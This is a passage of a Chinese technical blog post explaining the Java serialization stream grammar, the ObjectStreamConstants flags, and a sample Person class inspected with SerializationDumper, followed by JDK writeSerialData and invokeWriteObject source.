class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fields:</span><br><span class="line">  (<span class="keyword">short</span>)&lt;count&gt;  fieldDesc[count]</span><br></pre></td></tr></table></figure><p><code>&lt;count&gt;</code>表示该类中fields总数，数据类型为<code>short</code>类型。</p><p><code>fieldDesc[count]</code>表示一个类中所有字段的详细描述信息，字段的数量和前边的count是一致的；</p><h3 id="fieldDesc"><a href="#fieldDesc" class="headerlink" title="fieldDesc"></a>fieldDesc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fieldDesc:</span><br><span class="line">  primitiveDesc</span><br><span class="line">  objectDesc</span><br></pre></td></tr></table></figure><p>表示fields描述信息</p><p>两部分：</p><ul><li>primitiveDesc ： 基础类型数据的描述符</li><li>objectDesc ：对象数据类型的描述信息</li></ul><h3 id="primitiveDesc"><a href="#primitiveDesc" class="headerlink" title="primitiveDesc"></a>primitiveDesc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">primitiveDesc:</span><br><span class="line">  prim_typecode fieldName</span><br></pre></td></tr></table></figure><p>表示8种基础类型的字段的相关描述信息。</p><p>prim_typecode ：基本类型字段的类型 如下</p><p>fieldName ： 字段名字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`B`       <span class="comment">// byte</span></span><br><span class="line">`C`       <span class="comment">// char</span></span><br><span class="line">`D`       <span class="comment">// double</span></span><br><span class="line">`F`       <span class="comment">// float</span></span><br><span class="line">`I`       <span class="comment">// integer</span></span><br><span class="line">`J`       <span class="comment">// long</span></span><br><span class="line">`S`       <span class="comment">// short</span></span><br><span class="line">`Z`       <span class="comment">// boolean</span></span><br></pre></td></tr></table></figure><h3 id="objectDesc"><a href="#objectDesc" class="headerlink" title="objectDesc"></a>objectDesc</h3><p> 对象类型的field的描述信息。</p><p>对象类型字段 = 该成员</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objectDesc:</span><br><span class="line">  obj_typecode fieldName className1</span><br></pre></td></tr></table></figure><p>obj_typecode ：该成员的类型 如下</p><p>fieldName：该成员的名字</p><p>className1：该对象的类全名，String，<em>// 包含字段类型的字符串，字段描述符格式</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`[`       <span class="comment">// array</span></span><br><span class="line">`L`       <span class="comment">// object</span></span><br></pre></td></tr></table></figure><h3 id="classAnnotation"><a href="#classAnnotation" class="headerlink" title="classAnnotation"></a>classAnnotation</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">classAnnotation:</span><br><span class="line">  endBlockData</span><br><span class="line">  contents endBlockData      <span class="comment">// contents written by annotateClass</span></span><br></pre></td></tr></table></figure><p>该对象所属类中的<code>Annotation</code>的描述信息</p><p>endBlockData : 终止符 意味着存储对象的数据块[Data-Block]的结束</p><p>contents endBlockData：该类中多个content的终止</p><p>这里多说一点：</p><p>classAnotation是由ObjectOutputStream的annotateClass()方法写入的。</p><p>由于annotateClass()方法默认什么都不做。所以classAnnotations一般都是TC_ENDBLOCKDATA。</p><h3 id="newArray"><a href="#newArray" class="headerlink" title="newArray"></a>newArray</h3><p>一个新的数组的描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newArray:</span><br><span class="line">  <span class="function">TC_ARRAY classDesc <span class="title">newHandle</span> <span class="params">(<span class="keyword">int</span>)</span>&lt;size&gt; values[size]</span></span><br></pre></td></tr></table></figure><p>TC_ARRAY ：表示新的数组类型的序列化对象的开始</p><p>classDesc：这个数组的类描述符号</p><p>newHandle：针对当前数组对象的引用</p><p><code>(int)&lt;size&gt;</code>：该数组的长度，长度为int类型</p><p>values[size]：表示当前数组每一个元素值部分的内容</p><h3 id="newString"><a href="#newString" class="headerlink" title="newString"></a>newString</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newString:</span><br><span class="line">  <span class="function">TC_STRING <span class="title">newHandle</span> <span class="params">(utf)</span></span></span><br><span class="line"><span class="function">  TC_LONGSTRING <span class="title">newHandle</span> <span class="params">(<span class="keyword">long</span>-utf)</span></span></span><br></pre></td></tr></table></figure><p>表示一个字符串类型的对象</p><p>两种类型：<code>STRING</code>  <code>LONGSTRING</code></p><h3 id="newEnum"><a href="#newEnum" class="headerlink" title="newEnum"></a>newEnum</h3><p>表示一个枚举类型的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newEnum:</span><br><span class="line">  TC_ENUM classDesc newHandle enumConstantName</span><br></pre></td></tr></table></figure><p><code>TC_ENUM</code>为枚举类型的标识，表示接下来的序列类型是枚举类型</p><p><code>classDesc</code>为一个枚举类型的类描述符</p><p><code>newHandle</code>为该枚举对象的引用</p><p><code>enumConstantName</code>的值为调用枚举类型中的<code>name()</code>方法返回的枚举类型的值对应的字符串字面量</p><h3 id="enumConstantName"><a href="#enumConstantName" class="headerlink" title="enumConstantName"></a>enumConstantName</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enumConstantName:</span><br><span class="line">  (String)object</span><br></pre></td></tr></table></figure><p> 枚举常量的字符串名称字面量，本身为一个字符串。</p><h3 id="prevObject"><a href="#prevObject" class="headerlink" title="prevObject"></a>prevObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prevObject</span><br><span class="line">  TC_REFERENCE (<span class="keyword">int</span>)handle</span><br></pre></td></tr></table></figure><p>表示前一个对象，handle表示是前一个对象的引用。</p><h3 id="nullReference"><a href="#nullReference" class="headerlink" title="nullReference"></a>nullReference</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nullReference</span><br><span class="line">  TC_NULL</span><br></pre></td></tr></table></figure><p>表示null，一般这个值表示空引用。</p><h3 id="exception"><a href="#exception" class="headerlink" title="exception"></a>exception</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exception:</span><br><span class="line">  <span class="function">TC_EXCEPTION <span class="title">reset</span> <span class="params">(Throwable)</span>object         reset</span></span><br></pre></td></tr></table></figure><p>表示异常</p><p>TC_EXCEPTION ： 异常信息的标识符</p><h3 id="blockdata"><a href="#blockdata" class="headerlink" title="blockdata"></a>blockdata</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blockdata:</span><br><span class="line">  blockdatashort</span><br><span class="line">  blockdatalong</span><br></pre></td></tr></table></figure><p>在Java序列化中，数据块存储分为<strong>两</strong>种:</p><p>一种是长度为short的默认数据块方式</p><p>另外一种是长度为int的数据块方式，这种方式可存储容量大的数据；</p><p>如果我们只是往流中写入的是基本数据类型的数据，比如整数、浮点数，会在流中使用<code>blockdata</code>进行标记。</p><h3 id="endBlockData"><a href="#endBlockData" class="headerlink" title="endBlockData"></a>endBlockData</h3><p>Data-Block结束的标记</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blockdatashort:</span><br><span class="line">  TC_BLOCKDATA (unsigned <span class="keyword">byte</span>)&lt;size&gt; (<span class="keyword">byte</span>)[size]</span><br><span class="line"></span><br><span class="line">blockdatalong:</span><br><span class="line">  TC_BLOCKDATALONG (<span class="keyword">int</span>)&lt;size&gt; (<span class="keyword">byte</span>)[size]</span><br><span class="line"></span><br><span class="line">endBlockData   :</span><br><span class="line">  TC_ENDBLOCKDATA</span><br></pre></td></tr></table></figure><h3 id="classdata"><a href="#classdata" class="headerlink" title="classdata[]"></a>classdata[]</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">classdata:</span></span><br><span class="line">  nowrclass                 <span class="comment">// SC_SERIALIZABLE &amp; classDescFlag &amp;&amp;</span></span><br><span class="line">                            <span class="comment">// !(SC_WRITE_METHOD &amp; classDescFlags)</span></span><br><span class="line">  wrclass objectAnnotation  <span class="comment">// SC_SERIALIZABLE &amp; classDescFlag &amp;&amp;</span></span><br><span class="line">                            <span class="comment">// SC_WRITE_METHOD &amp; classDescFlags</span></span><br><span class="line">  externalContents          <span class="comment">// SC_EXTERNALIZABLE &amp; classDescFlag &amp;&amp;</span></span><br><span class="line">                            <span class="comment">// !(SC_BLOCKDATA  &amp; classDescFlags</span></span><br><span class="line">  objectAnnotation          <span class="comment">// SC_EXTERNALIZABLE &amp; classDescFlag&amp;&amp; </span></span><br><span class="line">                            <span class="comment">// SC_BLOCKDATA &amp; classDescFlags</span></span><br></pre></td></tr></table></figure><h3 id="nowrclass"><a href="#nowrclass" class="headerlink" title="nowrclass"></a>nowrclass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nowrclass:</span><br><span class="line">  values                    <span class="comment">// 类描述符顺序的字段</span></span><br></pre></td></tr></table></figure><p>一个类中可序列化的字段的数据值，这些数据值的顺序遵循类描述符中定义的顺序；</p><h3 id="wrclass"><a href="#wrclass" class="headerlink" title="wrclass"></a>wrclass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wrclass:</span><br><span class="line">  nowrclass</span><br></pre></td></tr></table></figure><p>这部分数据的内容和上述的nowrclass部分的内容是一样的，表一个类中可序列化的字段的数据值；</p><h3 id="externalContents"><a href="#externalContents" class="headerlink" title="externalContents"></a>externalContents</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">externalContents:         <span class="comment">// externalContent written by </span></span><br><span class="line">  externalContent         <span class="comment">// writeExternal in PROTOCOL_VERSION_1.</span></span><br><span class="line">  externalContents externalContent</span><br></pre></td></tr></table></figure><p>在<code>PROTOCOL_VERSION_1</code>中由<code>writeExternal</code>编写的外部内容。</p><p>这部分内容是上述的external内容的一个集合，一般这一部分<strong>只包含</strong>了使用<code>writeExternal</code>方法以<code>PROTOCOL_VERSION_1</code>的版本写入字节流的数据；</p><h3 id="externalContent"><a href="#externalContent" class="headerlink" title="externalContent"></a>externalContent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">externalContent:          <span class="comment">// Only parseable by readExternal</span></span><br><span class="line">  ( bytes)                <span class="comment">// primitive data 基础数据 8种</span></span><br><span class="line">    object</span><br></pre></td></tr></table></figure><p>这部分描述的是external的相关内容</p><p><code>(bytes)</code>部分的数据只能被<code>readExternal</code>方法读取，而且里面一般包含的数据类型是基础类型数据，<code>object</code>表示对象数据类型；</p><h3 id="objectAnnotation"><a href="#objectAnnotation" class="headerlink" title="objectAnnotation"></a>objectAnnotation</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">objectAnnotation:</span><br><span class="line">  endBlockData</span><br><span class="line">  contents endBlockData     <span class="comment">// contents written by writeObject</span></span><br><span class="line">                            <span class="comment">// or writeExternal PROTOCOL_VERSION_2.</span></span><br></pre></td></tr></table></figure><p>这部分数据的内容和<code>classAnnotation</code>的数据结构是一致的；</p><p>表示该对象所属类中的<code>Annotation</code>的描述信息，<code>endBlockData</code>为存储对象的数据块【<code>Data-Block</code>】的<strong>结束标记</strong>，为终止符，<code>contents</code>表示该类中多个内容的一个集合【contents】；</p><h2 id="values"><a href="#values" class="headerlink" title="values"></a>values</h2><p>针对当前对象的<code>classDesc</code>对应的类描述信息提供描述类型的大小和类型；</p><blockquote><p>The size and types are described by the classDesc for the current object</p></blockquote><h2 id="newHandle"><a href="#newHandle" class="headerlink" title="newHandle"></a>newHandle</h2><p>序列中的下一个数值将赋值给一个可序列化或者可执行反序列化的对象引用；</p><h2 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h2><p>一个已知对象的集合将会<strong>被放弃</strong>，重置该字节流；</p><blockquote><p>// The set of known objects is discarded so the objects of the exception do not overlap with the previously sent objects or with objects that may be sent after the exception</p></blockquote><h1 id="终端常量标识符"><a href="#终端常量标识符" class="headerlink" title="终端常量标识符"></a>终端常量标识符</h1><p>在<code>java.io.ObjectStreamConstants</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">short</span> STREAM_MAGIC = (<span class="keyword">short</span>)<span class="number">0xaced</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">short</span> STREAM_VERSION = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_NULL = (<span class="keyword">byte</span>)<span class="number">0x70</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_REFERENCE = (<span class="keyword">byte</span>)<span class="number">0x71</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_CLASSDESC = (<span class="keyword">byte</span>)<span class="number">0x72</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_OBJECT = (<span class="keyword">byte</span>)<span class="number">0x73</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_STRING = (<span class="keyword">byte</span>)<span class="number">0x74</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_ARRAY = (<span class="keyword">byte</span>)<span class="number">0x75</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_CLASS = (<span class="keyword">byte</span>)<span class="number">0x76</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_BLOCKDATA = (<span class="keyword">byte</span>)<span class="number">0x77</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_ENDBLOCKDATA = (<span class="keyword">byte</span>)<span class="number">0x78</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_RESET = (<span class="keyword">byte</span>)<span class="number">0x79</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_BLOCKDATALONG = (<span class="keyword">byte</span>)<span class="number">0x7A</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_EXCEPTION = (<span class="keyword">byte</span>)<span class="number">0x7B</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_LONGSTRING = (<span class="keyword">byte</span>) <span class="number">0x7C</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_PROXYCLASSDESC = (<span class="keyword">byte</span>) <span class="number">0x7D</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> TC_ENUM = (<span class="keyword">byte</span>) <span class="number">0x7E</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span>  <span class="keyword">int</span>   baseWireHandle = <span class="number">0x7E0000</span>;</span><br></pre></td></tr></table></figure><p><code>classDescFlags</code>会用到的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_WRITE_METHOD = <span class="number">0x01</span>; <span class="comment">//if SC_SERIALIZABLE</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_BLOCK_DATA = <span class="number">0x08</span>;    <span class="comment">//if SC_EXTERNALIZABLE</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_SERIALIZABLE = <span class="number">0x02</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_EXTERNALIZABLE = <span class="number">0x04</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">byte</span> SC_ENUM = <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><p>协议还说的一段话，暂时看不懂，先写上：</p><blockquote><p> The flag <em>SC_WRITE_METHOD</em> is set if the Serializable class writing the stream had a <code>writeObject</code> method that may have written additional data to the stream. In this case a <em>TC_ENDBLOCKDATA</em> marker is always expected to terminate the data for that class.</p></blockquote><blockquote><p> The flag <em>SC_BLOCKDATA</em> is set if the <code>Externalizable</code> class is written into the stream using <code>STREAM_PROTOCOL_2</code>. By default, this is the protocol used to write <code>Externalizable</code> objects into the stream in JDK 1.2. JDK 1.1 writes <em>STREAM_PROTOCOL_1</em>.</p></blockquote><blockquote><p>The flag <em>SC_SERIALIZABLE</em> is set if the class that wrote the stream extended <code>java.io.Serializable</code> but not <code>java.io.Externalizable</code>, the class reading the stream must also extend <code>java.io.Serializable</code> and the default serialization mechanism is to be used.</p></blockquote><blockquote><p> The flag <em>SC_EXTERNALIZABLE</em> is set if the class that wrote the stream extended <code>java.io.Externalizable</code>, the class reading the data must also extend <code>Externalizable</code> and the data will be read using its <code>writeExternal</code> and <code>readExternal</code> methods.</p></blockquote><blockquote><p> The flag <em>SC_ENUM</em> is set if the class that wrote the stream was an enum type. The receiver’s corresponding class must also be an enum type. Data for constants of the enum type will be written and read as described in <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serial-arch.html#a6469" target="_blank" rel="noopener">Section 1.12, “Serialization of Enum Constants</a>“.</p></blockquote><p>如果写入流的可序列化类具有<code>writeObject</code>方法，并且若该方法已将其他数据写入 stream ，则会设置标志<code>SC_WRITE_METHOD</code>。在这种情况下，<code>TC_ENDBLOCKDATA</code>标记总是希望终止该类的数据。</p><p>如果使用<code>SC_BLOCKDATA</code>将<code>Externalizable</code>类写入 stream，则设置标志<code>SC_BLOCKDATA</code>。默认情况下，在<code>JDK 1.2</code>中将<code>Externalizable</code>对象写入stream的协议。<code>JDK1.1</code>中写入<code>STREAM_PROTOCOL_1</code></p><p>如果编写 stream 的类扩展了<code>java.io.SERIALIZABLE</code>而不是<code>java.io.Externalizable</code>，那么会设置标志 <code>SC_SERIALIZABLE</code>，读取 stream 的类也必须扩展<code>java.io.SERIALIZABLE</code>，并使用默认的序列化机制。</p><p>如果编写 stream 扩展<code>java.io.EXTERNALIZABLE</code>的类，读取数据的类也必须扩展<code>EXTERNALIZABLE</code>，并且如果使用其<code>writeExternal</code>和<code>readExternal</code>方法读取数据，那么会设置标记<code>SC_EXTERNALIZABLE</code>。</p><p>如果写入 stream 的类是枚举类型，则会设置标志<code>SC_ENUM</code>。接收方的对应类也必须是枚举类型。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>这里写一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"0range"</span>, <span class="number">100</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"0rangetest.ser"</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接上<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>看结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar SerializationDumper.jar  -r test.ser</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210716200321909.png" alt="image-20210716200321909"></p><p>思考一个问题，如果我们Person实现了<code>writeObject</code>方法，会怎么样呢？</p><p>如果Person有<code>writeObject</code>方法，那要怎么设计呢？</p><p>先解释第二个问题，来到<code>java.io.ObjectOutputStream#writeSerialData</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes instance data for each serializable class of given object, from</span></span><br><span class="line"><span class="comment"> * superclass to subclass.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果该类有<code>writeObject</code>方法，那么就<code>slotDesc.invokeWriteObject(obj, this);</code></p><p>跟进<code>invokeWriteObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Invokes the writeObject method of the represented serializable class.</span></span><br><span class="line"><span class="comment"> * Throws UnsupportedOperationException if this class descriptor is not</span></span><br><span class="line"><span class="comment"> * associated with a class, or if the class is externalizable,</span></span><br><span class="line"><span class="comment"> * non-serializable or does not define writeObject.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invokeWriteObject</span><span class="params">(Object obj, ObjectOutputStream out)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, UnsupportedOperationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    requireInitialized();</span><br><span class="line">    <span class="keyword">if</span> (writeObjectMethod != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObjectMethod.invoke(obj, <span class="keyword">new</span> Object[]&#123; out &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            Throwable th = ex.getTargetException();</span><br><span class="line">            <span class="keyword">if</span> (th <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (IOException) th;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                throwMiscException(th);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="comment">// should not occur, as access checks have been suppressed</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span 